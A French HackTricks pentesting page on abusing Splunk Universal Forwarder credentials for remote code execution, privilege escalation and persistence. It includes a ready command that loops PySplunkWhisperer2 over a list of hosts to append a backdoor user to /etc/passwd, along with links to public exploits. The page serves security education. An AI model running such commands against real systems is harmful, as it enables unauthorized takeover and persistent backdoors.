# Splunk LPE et Persistance

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}

Si vous **énumérez** une machine **en interne** ou **en externe** et que vous trouvez **Splunk en cours d'exécution** (port 8090), si vous avez la chance de connaître des **identifiants valides**, vous pouvez **abuser du service Splunk** pour **exécuter un shell** en tant qu'utilisateur exécutant Splunk. Si root l'exécute, vous pouvez élever vos privilèges à root.

De plus, si vous êtes **déjà root et que le service Splunk n'écoute pas uniquement sur localhost**, vous pouvez **voler** le fichier **de mot de passe** **du** service Splunk et **craquer** les mots de passe, ou **ajouter de nouveaux** identifiants. Et maintenir la persistance sur l'hôte.

Dans la première image ci-dessous, vous pouvez voir à quoi ressemble une page web Splunkd.

## Résumé de l'Exploit de l'Agent Splunk Universal Forwarder

Pour plus de détails, consultez le post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ceci est juste un résumé :

**Aperçu de l'Exploit :**
Un exploit ciblant l'Agent Splunk Universal Forwarder (UF) permet aux attaquants disposant du mot de passe de l'agent d'exécuter du code arbitraire sur les systèmes exécutant l'agent, compromettant potentiellement un réseau entier.

**Points Clés :**
- L'agent UF ne valide pas les connexions entrantes ni l'authenticité du code, le rendant vulnérable à l'exécution non autorisée de code.
- Les méthodes courantes d'acquisition de mots de passe incluent leur localisation dans des répertoires réseau, des partages de fichiers ou de la documentation interne.
- Une exploitation réussie peut conduire à un accès au niveau SYSTEM ou root sur les hôtes compromis, à l'exfiltration de données et à une infiltration réseau supplémentaire.

**Exécution de l'Exploit :**
1. L'attaquant obtient le mot de passe de l'agent UF.
2. Utilise l'API Splunk pour envoyer des commandes ou des scripts aux agents.
3. Les actions possibles incluent l'extraction de fichiers, la manipulation de comptes utilisateurs et la compromission du système.

**Impact :**
- Compromission totale du réseau avec des permissions au niveau SYSTEM/root sur chaque hôte.
- Potentiel de désactivation de la journalisation pour échapper à la détection.
- Installation de portes dérobées ou de ransomware.

**Commande Exemple pour l'Exploitation :**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits publics utilisables :**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abus de requêtes Splunk

**Pour plus de détails, consultez le post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
